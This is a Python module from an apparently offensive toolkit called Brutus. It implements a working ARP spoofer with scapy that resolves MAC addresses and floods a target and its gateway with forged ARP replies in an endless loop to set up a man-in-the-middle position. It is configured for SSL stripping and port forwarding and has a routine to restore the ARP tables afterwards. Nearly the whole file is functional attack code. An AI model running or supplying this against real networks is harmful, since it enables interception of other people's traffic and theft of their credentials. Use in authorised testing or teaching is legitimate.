"""Exposes an API for an ARP Spoofer
"""
import sys
import time
from typing import Callable

import scapy.all as scapy  # type: ignore

from brutus.models.BaseBrutusModule import BaseBrutusModule


class ArpSpoofer(BaseBrutusModule):
    """Implements an ARP Spoofer; rearranges a target's ARP tables such that
       Brutus becomes the MITM, or intermediary entity between the given
       client/gateway

    Inherits:
        BaseBrutusModule
    """

    def __init__(self, target_ip: str, gateway_ip: str) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.resolve_mac_from_ip(self.target_ip)
        self.gateway_mac = self.resolve_mac_from_ip(self.gateway_ip)

        super().__init__(
            requires_mitm_state=False,
            strip_ssl=True,
            needs_port_fwd=True,
            module_path='brutus.interfaces.arp_spoofer.inquirer',
        )

    @staticmethod
    def resolve_mac_from_ip(ip_addr) -> str:
        """Resolves a given IP address' corresponding MAC address

        Args:
            ip_addr (str)

        Returns:
            str
        """
        arp_request = scapy.ARP(pdst=ip_addr)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        acknowledged_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[
            0
        ]

        return acknowledged_list[0][1].hwsrc

    @staticmethod
    def spoof_routine(target_ip: str, spoof_ip: str, target_mac: str) -> None:
        """Sends packets to manipulate the target's
           IP tables to associate the controller with the spoof IP.

        Args:
            target_ip (str)
            spoof_ip (str)
            target_mac (str)
        """
        arp_response_packet = scapy.ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
        )
        scapy.send(arp_response_packet, verbose=False)

    @staticmethod
    def restore_ip_tables(
        target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str
    ) -> None:
        """Restores target(s)' ARP tables

        Args:
            target_ip (str)
            gateway_ip (str)
            target_mac (str)
            gateway_mac (str)
        """
        arp_packet = scapy.ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac
        )
        scapy.send(arp_packet, count=4, verbose=False)

    def cleanup(self) -> None:
        """Restore all rearranged IP tables"""
        self.restore_ip_tables(
            self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac
        )

        self.restore_ip_tables(
            self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac
        )

    def spoof(self, callback: Callable) -> None:
        """Enact the ARP spoof, invoking the callback
           for each packet transaction

        Args:
            callback (Callable): invoked with packets_sent: int
        """
        sent_packets_count = 0

        while True:
            # inform the client we are the router
            self.spoof_routine(self.target_ip, self.gateway_ip, self.target_mac)

            # inform the router we are the client
            self.spoof_routine(self.gateway_ip, self.target_ip, self.gateway_mac)

            sent_packets_count += 2
            callback(sent_packets_count)

            sys.stdout.flush()
            time.sleep(2)
